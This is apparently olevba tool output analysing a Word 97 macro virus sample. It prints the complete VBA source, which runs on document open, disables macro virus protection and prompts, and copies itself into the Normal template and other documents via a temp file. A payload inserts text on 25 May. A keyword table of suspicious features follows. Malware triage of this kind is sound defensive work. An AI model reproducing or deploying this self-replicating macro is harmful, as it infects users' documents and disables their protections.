olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.de-8acb4ead7f49797e81182012109bd6edadbbb623
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.de-8acb4ead7f49797e81182012109bd6edadbbb623 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Dim temp
Options.VirusProtection = 0
CM64 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Options.ConfirmConversions = 0
Application.EnableCancelKey = 0
KL63 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
Options.SaveNormalPrompt = 0
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set TQ94 = ActiveDocument.VBProject.VBComponents.Item(1)
OI83 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set TQ94 = NormalTemplate.VBProject.VBComponents.Item(1)
SC10 = True
End If
If SC10 = True Then
ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\lover.sys"
TQ94.CodeModule.AddFromFile ("c:\lover.sys")
TQ94.CodeModule.deletelines 1, 4
TQ94.CodeModule.replaceline 1, "Sub AutoClose()"
ElseIf OI83 = True Then
TQ94.CodeModule.AddFromFile ("c:\lover.sys")
TQ94.CodeModule.deletelines 1, 4
End If
If Day(Now()) = 25 And Month(Now()) = 5 Then
    For temp = 1 To 50 Step 1
        ActiveDocument.Content.InsertAfter " Word97.Lover "
    Next temp
End If
RU85:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

